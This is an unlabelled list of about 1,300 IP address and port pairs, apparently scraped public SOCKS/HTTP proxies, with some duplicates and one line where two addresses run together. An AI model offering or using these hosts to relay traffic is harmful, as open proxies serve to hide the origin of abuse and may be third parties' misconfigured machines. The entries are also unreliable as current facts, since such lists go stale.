131.255.191.50:4153
36.66.71.27:5678
174.138.54.143:3128
188.133.153.187:8081
103.59.203.189:4145
109.200.156.102:8080
88.146.204.49:4153
91.93.118.3:8090
115.178.27.155:5678
82.117.204.174:5678
200.32.105.86:4153
159.89.99.115:8080
89.42.108.254:5678
79.101.45.94:56921
181.129.2.90:8081
24.43.140.138:8080
210.61.216.66:33990
177.107.32.149:4153
142.93.137.235:47896
110.165.23.162:80
185.66.56.4:42647
79.98.1.32:34746
95.0.168.54:1976
168.8.209.253:8080
91.93.143.10:4153
181.129.144.59:3629
109.232.106.236:52435
202.165.38.185:5678
192.210.232.74:33042
23.94.73.246:1080
181.143.94.42:999
125.141.133.99:5566
71.71.162.234:39593
200.116.198.140:37092
95.82.169.251:5678
183.88.214.58:5678
134.209.178.70:8890
103.146.110.22:50860
103.101.194.34:5430
103.164.107.114:5678
103.102.141.40:4145
196.25.165.78:5678
211.21.125.32:4153
43.224.10.27:6667
103.58.16.254:4145
181.143.54.162:4153
200.109.65.110:4153
91.98.112.182:4145
177.129.63.142:4153
112.53.83.102:808
71.172.141.30:5678
38.91.57.43:3128
203.128.77.42:3629
201.140.99.140:1080
31.163.202.55:3629
188.225.189.228:5678
27.123.223.210:4145
45.174.71.2:1080
190.121.232.122:5678
182.23.36.82:4153
197.234.13.77:4145
41.32.151.179:5678
121.42.9.57:57223
150.129.151.42:6667
45.238.57.1:3629
36.91.45.10:51672
176.114.228.40:44604
163.172.148.122:32811
161.49.158.165:5678
91.185.236.236:4145
103.58.75.29:5678
36.95.112.65:5678
169.57.157.146:8123
181.212.10.89:4153
122.200.150.17:4153
45.182.115.7:4153
167.71.214.4:45062
78.37.99.51:4153
195.175.87.14:4153
103.150.110.202:9969
189.89.168.134:4145
89.212.90.179:4145
196.3.98.242:8080
212.225.227.96:4153
80.81.232.145:5678
103.111.219.149:4145
46.240.132.22:4153
50.236.148.254:31699
181.174.85.107:5678
92.42.109.189:1080
71.167.56.3:5678
103.79.96.209:4153
180.180.124.248:49992
43.224.8.14:6667
210.10.205.142:5678
50.233.42.98:30717
106.58.218.185:5678
36.95.161.147:4153
83.218.186.22:5678
169.57.157.148:25
208.97.190.236:3128
190.186.56.242:5678
45.7.176.42:39867
222.74.65.83:38051
180.211.179.82:5678
43.248.24.226:4145
85.105.83.125:4153
103.235.34.234:1834
149.34.3.85:4145
109.86.219.161:3629
131.100.51.250:999
80.254.50.70:3629
91.105.152.168:4145
101.51.106.70:49285
168.228.224.68:3629
1.179.151.165:31948
106.14.187.182:21673
98.115.7.156:8080
36.92.43.107:8080
159.192.121.240:4145
154.236.179.226:1981
172.104.60.24:40424
103.175.80.54:1080
89.133.142.209:4145
185.136.151.138:5678
213.136.86.246:46915
37.98.231.12:1080
95.213.154.54:31337
109.87.46.125:5678
180.178.190.66:1080
102.38.50.65:4153
138.197.106.75:15459
118.174.196.112:36314
1.186.40.177:39651
27.111.45.18:55443
103.140.75.11:5678
103.103.192.122:4145
94.74.104.163:8118
103.102.141.39:4145
36.95.245.95:5678
103.251.221.17:4145
103.140.35.50:5678
185.162.93.62:9050
190.13.80.26:4145
187.95.136.194:5678
36.66.36.252:4153
27.147.217.194:51873
143.202.129.170:5678
124.158.175.26:8080
81.218.45.207:4145
36.92.77.241:5678
94.228.207.45:39603
157.245.62.1:9050
58.147.170.114:8085
103.101.100.26:8080
157.245.90.60:40373
36.111.166.135:8888
46.171.28.162:59311
200.114.66.20:999
182.160.121.99:10800
198.229.231.13:8080
186.219.96.47:49923
36.95.235.18:3629
8.136.159.152:8877
31.41.225.205:45067
85.172.60.202:1181
42.62.179.243:4153
103.12.161.196:57701
223.25.101.86:5678
104.168.87.16:1080
159.8.114.34:8123
88.255.185.236:1082
45.67.229.104:30003
112.53.83.102:1080
50.62.63.126:37626
140.83.81.231:12345
79.137.34.146:42884
103.46.233.80:4153
190.89.28.97:4145
47.242.230.213:12345
197.234.13.5:4145
103.127.21.42:5678
117.210.209.17:5678
180.211.191.38:5678
103.149.105.253:4153
192.241.178.187:20807
181.198.111.122:5678
31.14.124.62:4145
185.235.141.248:4153
117.239.240.202:53281
185.4.66.230:7777
210.56.244.210:4145
187.19.127.179:4153
103.19.130.50:8080
103.54.43.131:8080
134.236.255.6:5678
186.248.89.6:5005
124.41.228.175:5678
168.0.172.100:5678
187.49.193.202:5678
142.4.21.35:35181
185.87.121.5:8975
45.135.233.123:7777
195.39.243.198:3629
181.189.231.46:5678
103.80.210.33:5678
125.141.139.60:5566
85.25.111.162:5577
88.87.72.134:4145
41.215.74.26:5678
103.76.188.97:4153
193.70.46.201:25621
14.139.184.130:3128
45.70.204.21:4145
76.26.114.253:39593
216.105.151.126:39593
31.210.134.114:13080
103.106.242.157:4145
182.253.106.14:4145
185.215.163.94:3629
107.189.13.147:28071
95.0.219.234:8080
150.129.148.87:41889
138.68.57.62:9050
45.7.177.200:39867
190.171.174.82:5678
103.199.84.122:8080
45.58.40.150:20841
92.47.62.133:1080
212.115.248.78:5451
45.165.131.46:8080
78.39.189.112:3629
103.112.163.238:5678
103.206.252.218:4153
85.25.118.155:5577
185.175.119.206:36442
70.185.95.162:39593
80.28.208.118:10801
185.97.114.179:3629
46.10.199.90:54567
212.126.5.246:42344
123.231.136.59:4145
183.6.50.70:4153
129.205.196.242:5678
185.161.186.96:54321
113.162.84.218:1080
181.129.83.234:5678
103.117.108.25:4153
203.98.76.64:5678
178.62.62.139:22605
43.252.158.27:4145
103.16.60.22:50000
80.191.40.41:5678
88.135.41.204:4153
50.73.45.153:5678
173.249.57.9:443
188.175.207.27:5678
201.159.103.97:31337
190.92.103.20:5678
190.239.24.2:5678
201.186.131.56:999
54.202.153.246:80
159.203.167.54:51216
202.158.77.194:80
176.98.248.2:4153
46.140.98.214:4153
109.167.134.253:44788
86.111.144.10:4145
202.77.120.38:57965
115.85.72.202:5678
146.56.172.204:59394
172.87.134.62:5678
131.108.124.117:5678
117.62.165.54:7891
136.232.125.70:5678
49.51.69.212:21127
103.156.248.21:5678
196.175.250.205:1080
117.102.89.74:5678
177.67.14.45:35914
103.238.68.209:5678
201.87.103.127:5678
131.108.60.22:3629
62.4.51.9:5678
92.241.87.14:5678
120.25.199.24:1080
31.128.248.1:1080
187.111.160.8:42579
199.119.74.245:4145
152.231.62.172:5678
94.130.178.93:8085
5.160.72.148:43130
103.235.199.93:5678
80.91.120.38:5678
103.105.76.21:5678
198.1.94.46:15456
114.5.129.22:5678
212.112.110.238:5678
190.110.99.100:999
92.255.164.166:4145
45.119.82.33:48464
103.97.111.179:5678
173.212.248.58:42702
119.17.204.225:1080
202.150.164.146:5678
69.36.63.128:1080
36.37.92.1:4153
46.35.249.189:41419
200.5.253.242:5678
183.177.127.42:5678
104.139.74.25:34368
179.118.198.20:3128
85.132.3.74:4153
31.28.4.214:4153
202.152.51.44:8080
223.223.174.81:5678
198.199.86.169:9050
103.134.184.238:5430
117.121.211.170:8080
1.20.96.30:4153
197.232.253.210:5678
36.91.166.98:8080
188.133.138.197:8080
202.79.56.79:4153
36.89.183.77:31802
178.168.114.177:5678
181.39.74.170:5678
87.249.212.26:4145
190.145.220.238:3629
45.245.212.164:8080
112.109.20.238:8080
88.12.54.146:1081
74.143.245.221:80
213.87.103.45:4153
101.42.102.65:33980
176.62.178.247:47556
103.216.82.20:6667
159.65.24.24:9050
200.105.166.26:5678
189.90.63.122:4153
75.41.145.46:5678
77.238.79.111:5678
157.230.13.52:55904
177.74.183.10:4145
197.248.184.157:53281
117.54.200.186:443
143.208.200.26:7878
46.254.217.67:61781
103.197.251.205:80
50.197.210.138:32100
115.90.219.181:4145
37.216.246.59:5678
50.192.49.5:32100
103.93.185.82:5678
115.74.202.125:2177
41.65.236.35:1981
93.157.163.66:35081
154.0.15.166:5678
170.106.150.62:21127
190.108.81.140:59311
162.55.84.170:3128
115.72.38.7:5678
45.182.190.146:999
85.25.196.218:5566
49.0.32.177:10801
203.206.235.153:50042
91.197.10.22:8888
168.63.141.55:44270
76.81.164.246:8080
103.199.159.153:41610
138.68.252.165:9050
177.72.115.141:31164
41.65.163.84:1976
134.119.206.110:1080
185.180.131.71:5678
177.10.84.121:4145
45.186.150.17:5678
213.250.198.66:4145
64.227.53.22:9050
103.117.194.166:8080
72.223.168.67:4145
202.93.228.13:4153
103.146.111.222:50860
150.129.115.118:60416
200.54.194.13:53281
58.82.154.3:8080
47.56.69.11:8000
111.193.116.172:1080
103.68.0.242:5678
200.116.198.160:58927
102.69.146.168:5678
1.179.147.5:52210
45.7.178.102:39867
149.28.75.30:38088
119.2.54.25:5678
192.141.236.10:5678
88.80.119.227:1080
185.37.211.222:43358
192.241.182.108:15185
180.94.68.101:5678
170.84.51.235:55731
46.21.77.122:4153
43.248.136.148:20118
195.91.221.230:55443
207.176.12.246:5678
220.249.195.130:1080
91.250.61.5:3629
190.227.160.24:1080
103.241.227.110:6667
200.116.198.177:35184
119.28.26.243:35891
178.69.12.30:50893
197.254.97.250:80
45.160.221.153:5678
93.171.224.59:4153
49.231.200.212:8080
180.180.218.250:8080
47.243.135.104:8080
117.26.223.146:4216
93.190.141.62:9050
92.249.122.108:58749
96.9.66.200:4153
47.89.153.213:80
146.120.160.148:5678
203.189.152.216:5678
190.205.108.25:5678
203.75.190.21:80
78.186.99.87:1080
142.44.136.97:7001
119.3.231.232:8001
190.4.205.226:4153
95.128.142.76:1080
186.159.3.193:45524
12.187.55.1:39593
177.105.68.199:4153
24.37.138.6:4145
45.224.234.10:4153
177.54.228.147:5678
183.247.207.225:30001
188.169.142.196:4145
125.254.53.120:4153
217.217.175.32:4153
181.48.138.198:5678
47.245.56.108:18181
94.23.40.220:443
105.29.64.195:40400
186.219.96.225:52017
190.188.213.95:4153
103.113.3.182:4145
122.9.101.6:8888
77.89.201.70:5678
37.57.15.43:47233
188.92.107.26:4153
117.54.201.91:5678
95.67.19.181:3128
118.99.90.130:4145
178.79.161.73:32714
143.137.99.202:5678
42.62.179.2:4153
185.66.57.130:42647
198.245.63.37:14973
186.235.80.48:4145
68.208.51.61:8080
107.152.32.62:9050
207.174.202.218:8080
31.43.122.180:51372
38.140.231.10:8841
80.85.98.110:5678
188.133.158.145:8080
119.18.159.67:4153
222.190.222.95:8003
202.4.107.66:5678
222.129.33.153:57114
49.229.108.18:1080
213.5.120.255:3629
207.180.204.70:65432
134.19.254.2:4153
89.40.61.114:5678
115.127.162.234:8080
41.220.235.71:5678
122.55.185.226:5678
120.39.221.140:8001
45.5.152.72:1080
103.122.84.27:5678
149.54.12.122:5678
190.215.207.162:5678
185.66.57.112:42647
78.157.255.138:5678
190.210.141.170:5678
177.30.63.43:4153
109.75.47.204:4153
195.248.242.60:1080
182.48.82.160:4153
201.220.140.6:30575
110.77.135.70:4145
192.169.244.80:11514
91.126.138.135:5678
192.162.154.19:5678
51.68.97.32:1000
185.42.228.66:1080
77.108.78.20:48079
192.129.175.182:8118
20.47.108.204:8888
15.235.49.112:9300
178.18.243.41:9050
213.6.33.110:4145
110.78.22.40:8080
185.200.38.206:10820
138.204.140.199:53900
103.84.173.1:4153
103.76.190.37:31756
186.159.3.43:30334
129.146.229.159:20000
89.34.219.1:1080
115.85.86.114:5678
138.68.18.219:9050
223.223.174.49:5678
62.33.210.34:58918
118.127.125.34:5678
216.218.240.46:48324
67.205.191.23:18474
31.15.89.51:1099
185.61.152.137:8080
157.230.177.3:999
103.253.145.219:62162
108.62.49.50:9050
138.201.120.214:1080
41.215.10.6:4145
190.92.72.242:5678
50.232.250.157:8080
114.5.116.81:5678
178.212.65.61:3629
41.170.12.92:49142
119.81.189.194:80
103.117.108.46:36932
202.169.49.222:5678
157.245.28.79:53749
103.84.39.93:30740
119.81.189.194:25
103.82.8.201:4153
200.174.228.183:4153
49.128.218.147:15959
117.43.4.108:8003
102.38.50.133:4153
173.82.119.12:11623
45.76.63.76:39041
36.137.57.38:81
200.58.76.160:5678
36.95.116.69:5678
221.133.9.35:4004
178.134.71.138:37590
202.5.36.133:5678
5.188.64.79:5678
186.189.204.222:5678
117.206.83.102:4153
5.183.103.132:14999
45.7.177.210:39867
193.106.58.51:4153
109.237.92.138:4145
190.205.42.46:1080
46.149.34.206:3629
192.169.250.203:17296
117.102.115.158:4153
182.93.65.171:5678
104.131.65.115:1337
190.14.229.242:5678
139.196.229.151:43175
45.165.152.50:4145
82.200.55.38:4145
159.8.114.34:25
81.91.157.134:5678
85.197.32.251:4153
119.18.157.197:4145
62.103.186.66:4153
103.196.56.112:5678
41.90.245.23:8080
139.5.132.106:4153
183.89.165.55:4153
218.28.132.182:33339
36.95.65.99:8019
43.243.206.162:5678
103.146.184.53:1088
121.166.178.107:5002
134.119.206.107:1080
5.165.2.223:3629
125.141.133.49:5566
86.123.188.209:4145
212.72.149.234:4145
45.228.96.34:33406
82.114.97.157:1256
119.29.169.239:10005
43.243.172.2:83
43.224.10.46:6667
185.135.234.165:3629
186.183.158.186:5678
109.248.175.223:1088
94.240.24.91:5678
201.221.134.74:5678
125.16.111.194:8080
85.196.136.17:4153
182.23.107.210:3128
103.44.26.73:5678
92.207.253.226:38157
27.147.155.70:52596
213.32.252.134:5678
103.47.93.193:1080
103.111.137.94:5678
201.184.61.43:5678
103.17.90.6:5678
18.233.214.217:9050
175.106.17.62:49238
24.37.221.246:4145
101.200.137.28:8902
202.106.72.238:6666
179.43.98.186:5678
14.231.51.190:5678
49.48.32.114:4145
47.75.96.111:10005
151.80.252.69:8570
161.202.226.194:8123
43.249.28.146:13080
107.189.3.151:12833
5.22.154.50:32127
193.158.12.138:4153
178.62.79.49:25632
182.23.79.162:39902
113.162.84.138:1080
166.62.118.86:48127
109.238.229.233:4145
5.141.244.97:61288
115.75.99.65:4153
103.147.250.19:5678
150.129.201.30:6667
103.146.30.10:4145
134.119.206.106:1080
150.129.148.88:35101
162.243.146.217:31178
37.252.66.240:5678
138.117.141.27:8888
118.122.92.139:8000
179.49.161.58:999
178.140.24.253:4153
178.35.252.242:3629
124.158.167.171:5678
195.222.107.85:4153
190.220.17.34:44253
195.78.100.186:3629
181.78.16.198:5678
1.53.137.164:4145
168.0.8.45:4153
202.51.114.210:3128
170.78.92.38:5678
190.248.153.162:8080
103.160.212.214:1080
37.252.86.97:5678
91.211.66.202:8721
102.66.232.213:5678
155.254.9.2:36510
208.88.199.169:33140
189.59.95.145:4153
47.96.102.110:1080
203.190.149.143:1080
20.94.229.106:80
45.7.177.231:39867
202.62.47.129:5678
94.136.157.225:60030
190.184.144.222:5678
103.231.176.58:5678
89.205.12.83:5678
37.128.107.98:4145
163.172.157.7:80
212.200.160.106:5678
85.25.139.22:5577
212.200.80.97:5678
14.232.164.94:5678
187.111.160.29:34296
189.89.142.28:4145
104.248.162.187:50761
161.35.49.22:63856
77.238.70.145:9050
140.83.36.83:1000
77.50.104.110:3128
51.91.17.125:56148
109.195.102.115:5678
197.234.13.82:4145
159.8.114.37:25
181.168.93.14:4153
178.151.24.64:4145
103.216.82.20:6666
161.202.226.194:80
200.85.137.211:4153
92.50.155.218:8080
58.97.194.206:5678
182.53.197.156:43060
177.36.6.88:5678
212.86.74.70:1080
103.6.184.222:36983
189.124.138.137:5678
63.246.56.183:5678
209.213.42.215:64312
45.187.76.2:3629
103.111.53.82:58033
202.70.84.201:4153
185.13.221.243:4145
46.73.176.209:53281
123.31.12.41:36414
45.224.197.137:4145
124.158.160.180:5678
186.67.159.90:4145
176.123.218.6:18080
181.94.246.125:4153
187.130.139.197:37812
180.94.64.114:5678
164.132.95.241:20268
119.235.50.5:4145154.117.161.90:4153
154.117.161.90:4153
112.78.144.62:4145
113.160.154.7:4153
103.5.63.213:40544
43.224.10.43:6667
31.59.4.139:5678
67.55.184.74:1080
202.53.172.76:1080
91.187.55.39:5678
84.47.119.114:5678
1.20.104.76:4145
36.95.120.101:5678
197.248.28.17:10801
117.102.101.52:5678
185.86.5.162:8975
103.87.86.146:4153
13.231.137.2:48540
119.235.50.38:4153
77.71.231.67:5678
172.105.36.119:46107
177.73.248.38:55290
182.160.127.53:48744
5.183.179.95:14999
185.82.167.21:5678
80.254.185.73:1080
103.66.177.169:32251
128.199.109.51:50877
138.117.60.151:5678
69.160.4.206:5678
81.21.115.28:1080
176.108.129.244:1099
212.129.35.138:18703
118.98.65.146:4153
46.98.197.151:5678
94.139.170.82:33848
190.61.85.237:4153
187.243.250.222:1080
124.248.169.142:4145
103.82.13.89:5678
209.203.44.176:1080
192.145.205.74:4145
181.211.58.46:5678
190.111.248.194:4153
200.41.60.33:4153
3.22.167.115:48540
104.131.8.62:26147
46.147.194.197:1080
91.98.64.222:5678
182.16.240.49:30617
109.110.82.245:5678
181.170.79.55:4153
200.148.157.4:4153
103.149.104.2:4153
103.111.22.26:58563
103.141.12.161:1080
176.96.155.160:4153
49.156.42.188:5678
41.220.114.202:5678
102.23.128.1:5678
183.87.153.98:48785
5.164.23.109:44550
139.59.13.219:36799
176.56.107.197:39270
190.53.44.10:5678
103.122.154.2:4145
41.139.147.86:5678
46.160.230.220:5678
159.192.97.129:5678
202.158.49.140:39172
113.161.128.192:4153
81.143.236.200:443
192.177.186.49:1080
154.62.132.163:4153
113.160.227.32:1080
115.164.146.18:13629
106.245.183.58:4145
113.11.136.28:30993
117.220.171.105:4153
186.31.133.169:5678
103.86.194.214:5678
189.2.86.163:4153
103.115.164.33:5678
185.82.98.24:4153
130.185.77.48:44997
177.105.68.64:4153
82.117.211.14:4153
193.193.240.37:48785
45.55.32.201:63572
122.200.145.33:4153
103.116.202.241:5678
201.220.85.22:5678
45.221.73.46:5678
46.101.36.144:11475
181.230.24.15:4153
190.216.56.177:4153
202.62.9.132:5678
180.210.222.209:1080
121.101.185.69:43296
103.234.26.242:1080
103.86.194.210:5678
83.168.84.141:4153
103.216.82.19:6667
115.91.83.42:4145
138.186.135.1:4153
86.28.76.188:4145
45.120.126.10:32525
64.110.32.101:1080
36.91.54.25:33424
5.83.104.155:4153
181.78.16.236:5678
41.190.233.56:5678
196.43.106.38:5678
91.98.155.140:5678
206.189.237.58:29754
1.20.184.75:4153
1.179.186.68:1080
167.114.89.174:37666
173.195.27.155:10091
176.215.237.166:5678
94.136.157.114:60030
190.205.100.129:5678
45.70.0.129:4145
222.165.226.221:3629
154.79.249.72:5678
151.237.60.43:33427
103.141.12.194:1080
169.239.221.89:1080
185.93.240.132:10801
103.141.175.182:5678
197.155.81.134:5678
89.34.219.9:1080
190.119.167.154:5678
119.42.123.229:4145
125.25.204.99:14153
218.149.25.193:1111
84.224.215.222:4145
110.78.82.233:5678
178.62.64.42:41423
212.174.44.145:1080
138.204.234.27:5678
27.76.80.137:5006
103.169.130.26:5678
52.88.100.144:50000
117.20.57.159:5678
103.156.14.46:5678
139.255.94.122:57853
201.219.156.18:5678
200.231.188.18:4153
182.253.108.51:30448
121.58.195.140:4145
201.33.161.236:4153
109.87.130.6:5678
36.67.240.73:50892
171.225.165.43:5003
131.72.176.241:61221
122.200.151.249:4153
109.224.22.34:51372
91.214.130.253:61221
154.202.108.50:1080
103.233.152.180:1080
171.224.240.3:5678
176.10.45.106:5678
197.250.15.58:3043
142.4.13.233:35181
103.196.56.102:5678
46.146.209.132:32107
91.90.180.185:8080
101.100.201.223:9050
58.32.8.5:23456
79.137.34.146:42884
187.111.160.29:40098
120.24.54.224:1080
185.94.218.57:43403
167.114.36.197:36020
218.107.215.123:7302
103.159.46.14:83
60.12.215.23:7302
103.119.60.12:80
103.156.249.52:8080
125.141.139.197:5566
178.62.78.139:1081
20.47.108.204:8888
138.68.252.165:9050
20.94.229.106:80
110.185.160.248:7302
196.219.202.74:8080
174.77.111.197:4145
120.24.196.168:1080
200.54.194.13:53281
137.184.117.172:10154
1.12.224.175:9090
117.66.175.82:20010
39.153.211.238:7302
178.62.79.49:58886
79.101.67.154:8080
139.198.179.174:3128
120.79.93.245:1080
120.36.137.162:7302
122.193.18.143:7302
120.79.75.144:1080
103.161.164.115:8181
184.179.216.133:24630
123.138.199.106:7302
123.182.247.247:7302
52.183.8.192:3128
41.65.67.166:1981
218.77.59.52:7302
120.25.105.189:1080
120.25.199.24:1080
101.36.107.66:1080
183.88.215.252:8080
180.76.146.169:1080
176.103.49.41:16642
112.5.37.26:20011
192.169.250.173:56992
125.75.127.187:1111
134.119.206.106:1080
113.121.38.155:8902
107.172.79.116:43594
207.180.204.70:65432
111.35.16.184:7302
221.224.44.91:7302
198.199.86.169:9050
139.162.78.109:1080
189.11.248.162:8080
36.95.154.21:8080
179.1.73.100:999
103.241.227.110:6667
43.228.125.91:29835
94.249.192.197:8887
120.24.186.175:1080
61.175.121.98:7302
123.56.29.180:10808
113.0.71.246:7302
138.201.120.214:1080
60.165.35.64:7302
42.248.76.124:8902
144.76.224.49:46107
96.9.71.18:33427
14.118.134.170:7302
61.160.66.130:5555
45.165.131.46:8080
212.174.44.41:8080
144.202.105.234:19050
192.111.135.18:18301
159.65.69.186:9300
117.156.203.11:7302
110.78.22.40:8080
117.86.185.142:20006
221.234.38.240:8081
120.78.216.210:1080
218.64.85.211:7302
213.136.86.246:46915
183.245.209.58:7302
119.81.189.194:8123
51.254.44.184:17680
222.173.150.158:7302
222.217.74.84:7302
191.97.18.177:999
107.172.86.38:14999
117.187.234.219:7302
218.59.182.190:7302
173.166.191.6:3820
180.76.250.169:32766
176.236.141.30:10001
80.13.139.249:8118
122.193.18.163:7302
190.2.210.139:8080
115.231.240.147:7302
27.121.85.74:8080
120.24.192.141:1080
116.80.70.3:3128
85.159.2.171:8080
192.252.214.20:15864
58.18.36.61:7300
103.122.32.10:8080
144.48.112.34:8080
89.108.81.117:1080
118.185.38.153:35101
49.51.74.61:21127
186.24.4.249:8080
103.153.142.3:33427
212.174.242.114:8080
101.42.102.65:33980
159.75.245.82:8888
222.245.132.24:7302
58.57.158.99:7302
122.193.18.155:7302
112.94.161.228:1080
220.179.32.31:7300
117.157.71.7:7302
101.35.115.136:20012
116.212.142.231:33427
101.255.151.2:3128
34.146.157.204:9090
117.84.153.216:8902
183.238.171.106:51080
59.61.227.37:7302
91.194.239.122:8080
91.150.189.122:30389
124.121.104.28:8080
111.59.53.147:7302
222.175.234.10:7302
122.226.60.69:7302
117.177.146.48:7302
95.142.223.24:56379
204.13.155.104:14999
64.210.67.19:999
1.14.104.55:49915
8.210.48.101:18480
39.184.147.250:7302
120.76.244.145:1080
45.170.148.76:56437
120.76.246.84:1080
210.211.122.196:1080
106.12.7.50:10000
46.101.218.6:24040
186.97.172.178:60080
140.227.199.210:3128
91.217.42.3:8080
24.103.162.189:31337
20.76.104.250:8080
213.134.211.158:3128
70.166.167.55:57745
120.77.12.9:1080
192.111.130.5:17002
120.77.12.69:1080
203.193.131.74:3128
140.0.120.181:8080
47.106.216.160:1080
36.133.183.241:81
91.108.155.195:8080
222.189.207.82:7302
125.141.139.198:5566
150.136.98.25:9191
117.84.159.80:8902
119.23.217.80:1080
183.253.55.190:7302
115.241.197.126:80
117.43.4.108:8003
122.193.18.165:7302
222.223.124.205:7302
180.180.123.40:8080
77.236.252.133:1256
61.255.239.33:8008
112.74.125.25:1080
192.169.244.80:11514
47.106.139.240:1080
137.220.176.235:8080
173.212.248.58:1976
123.157.79.246:7302
176.9.119.170:1080
72.223.168.86:57481
95.87.14.245:8181
91.221.17.220:8000
1.180.49.222:7302
142.93.143.155:9010
151.80.136.138:3128
195.175.89.198:8080
172.105.201.56:19151
42.248.126.188:8902
45.55.32.201:63572
27.254.149.244:9050
195.138.73.54:44017
83.151.2.50:3128
173.212.240.33:56304
202.152.51.44:8080
103.47.67.154:8080
171.237.206.159:1080
5.35.14.167:9999
197.237.72.215:8080
223.87.72.142:7300
136.228.128.81:33427
188.166.104.152:57221
31.128.248.2:1080
139.162.241.13:1080
171.34.78.39:7302
103.161.164.101:8181
117.2.164.34:5107
46.147.194.197:1080
120.78.145.170:1080
146.56.161.140:1080
72.223.168.67:4145
60.255.230.169:7302
111.30.79.44:7302
85.25.196.218:5566
212.3.70.137:2583
221.211.62.3:1111
197.248.184.157:53281
120.24.195.168:1080
45.184.103.68:999
161.22.34.126:8080
61.153.184.158:7300
98.115.7.156:8080
46.36.64.250:33427
92.42.109.187:1080
144.126.142.41:17303
103.103.212.222:53281
200.35.56.161:35945
120.24.65.174:1080
179.1.129.134:999
188.143.235.128:7777
81.177.142.19:1080
61.133.218.202:7302
220.134.225.18:9119
113.124.222.61:8902
124.42.239.202:7302
218.76.142.140:7302
45.156.29.129:9090
209.146.19.59:55443
50.63.13.221:19225
103.241.227.110:6666
122.193.18.164:7302
193.70.46.201:44396
140.227.225.120:3128
113.8.193.78:7302
222.190.222.95:8003
91.92.94.69:41890
185.177.125.28:9051
5.160.91.130:3128
124.121.126.14:8213
107.189.3.151:12833
140.227.211.47:8080
202.109.183.139:7302
103.42.162.50:8080
76.81.164.246:8080
185.200.37.99:10820
103.14.198.217:83
40.119.207.194:24008
45.181.121.41:999
47.119.130.144:1080
72.49.49.11:31034
192.111.129.145:16894
91.210.176.104:1088
120.24.183.31:1080
218.89.51.225:7302
157.230.126.33:3128
36.89.252.155:8080
5.253.235.194:14999
95.210.251.29:53281
192.252.211.197:14921
138.201.154.35:24000
210.16.73.84:1080
120.195.199.62:7302
45.67.229.101:30001
123.183.174.69:7302
116.115.54.121:7302
96.9.88.190:33427
124.164.249.226:7302
193.242.151.44:8080
47.106.172.151:1080
42.248.76.63:8902
192.252.215.2:4145
124.205.206.227:7302
113.214.25.190:7302
47.98.151.6:11324
109.92.222.170:53281
182.52.140.57:8080
101.51.106.70:49285
211.118.206.225:5002
186.159.3.43:30334
82.157.146.116:10002
8.136.136.142:8877
192.111.139.163:19404
210.16.73.81:1080
88.198.50.103:1080
149.248.60.214:14000
66.42.36.3:49995
209.141.52.88:12345
91.207.147.243:38472
68.208.51.61:8080
49.128.202.136:46341
31.42.57.1:8080
185.243.56.171:14999
104.248.162.187:50761
120.76.100.23:1080
123.131.80.130:7302
218.5.228.202:7302
93.86.63.73:8080
120.24.195.44:1080
61.132.47.18:54191
104.238.80.180:18355
117.159.24.186:7302
201.157.252.38:9999
72.206.181.123:4145
47.107.108.14:1080
47.254.40.172:7328
190.120.252.237:999
45.207.36.97:1080
195.187.63.42:8080
138.68.18.219:9050
51.83.190.248:19050
128.199.213.193:9050
47.106.142.243:1080
45.58.40.150:20841
176.88.117.138:8080
173.212.220.213:20937
103.234.55.227:28885
31.22.7.188:35633
58.217.115.142:7302
203.176.139.14:33427
192.129.175.182:8118
42.248.121.197:8902
45.6.159.235:34523
129.226.125.228:31100
217.219.4.166:9100
178.170.54.205:9050
201.20.100.142:53281
36.67.152.213:11111
159.203.33.4:7108
208.102.51.6:58208
45.81.225.80:53584
116.228.160.99:7302
218.6.155.49:7302
120.24.237.141:1080
103.250.166.4:6667
140.227.202.253:3128
180.141.90.181:7302
81.174.11.159:61743
77.73.90.196:1337
45.7.135.233:999
47.115.149.82:443
128.199.96.113:18563
103.113.16.122:1080
177.54.229.1:9292
43.129.219.20:3001
120.224.122.36:7302
120.24.78.149:1080
120.237.253.142:1080
51.159.66.158:3128
36.137.57.38:81
140.83.52.150:1111
192.241.182.108:15185
1.4.198.67:8081
101.35.51.16:10080
170.79.12.72:9090
92.45.19.46:8080
72.221.172.203:4145
192.241.167.22:19197
178.252.141.206:8080
150.158.77.13:1088
85.25.99.106:5566
121.166.178.107:5002
190.1.201.58:8080
150.95.178.151:8888
216.245.192.130:18669
103.69.45.164:58199
49.128.218.147:15959
191.97.16.181:999
183.236.124.2:7300
46.101.207.6:9050
152.231.25.194:60080
61.147.172.150:7777
85.25.201.22:5577
39.152.104.167:7302
120.24.161.125:1080
20.94.179.174:1080
221.224.81.83:7302
103.216.82.37:6667
173.212.248.58:2087
14.140.131.82:3128
80.55.131.214:52014
140.227.203.41:3128
54.37.160.92:1080
222.217.74.162:1111
27.147.219.46:8080
5.183.101.101:14999
34.94.137.131:80
222.88.201.225:7302
113.121.37.64:8902
165.154.5.133:3512
203.12.200.32:1090
182.34.33.166:8902
79.133.120.35:48484
120.76.201.40:1080
212.156.55.34:8080
60.10.203.133:8006
93.179.94.133:5678
128.199.245.23:24527
150.109.32.166:80
178.154.228.16:9050
109.232.106.236:49565
85.25.195.177:5577
72.210.252.137:4145
61.134.48.51:7300
54.37.203.54:32556
117.84.154.186:8902
92.222.206.151:2020
211.140.228.229:7302
37.120.192.154:8080
122.15.211.126:80
112.95.227.6:7302
103.134.219.197:9050
98.170.57.231:4145
96.9.66.130:33427
23.88.36.141:9050
46.36.64.217:33427
103.214.202.105:8080
61.216.156.222:60808
146.56.112.236:5678
103.203.97.213:7300
120.24.57.170:1080
1.20.217.221:8080
218.29.61.178:7302
92.207.253.226:38157
61.133.8.86:7302
122.193.18.172:7302
161.97.123.237:3128
5.58.178.99:7777
61.161.196.126:7300
116.203.67.172:3128
120.24.201.59:1080
47.117.116.47:2002
45.224.111.39:55443
61.153.42.218:7302
185.32.6.131:8090
176.31.69.33:18144
192.252.215.5:16137
176.236.157.155:8080
120.79.184.141:1080
106.5.209.130:8001
89.19.116.102:41890
163.172.75.81:5566
91.193.253.188:23500
171.211.244.186:7302
167.114.89.169:37666
152.32.164.22:21616
120.24.53.117:1080
61.240.12.213:7302
85.25.111.162:5577
218.29.203.28:7302
96.9.71.19:33427
95.67.19.181:3128
120.24.68.247:1080
50.62.30.5:58490
85.25.139.22:5577
103.95.197.233:9050
164.70.70.77:3128
104.255.170.65:50503
51.83.140.70:8181
60.211.244.158:7300
45.81.225.67:7057
154.221.18.254:1080
78.139.124.87:8080
198.27.67.187:64083
42.248.120.10:8902
119.23.58.111:1080
85.172.31.16:33427
120.87.92.2:7302
139.59.1.14:1080
47.106.169.226:1080
89.111.133.217:9050
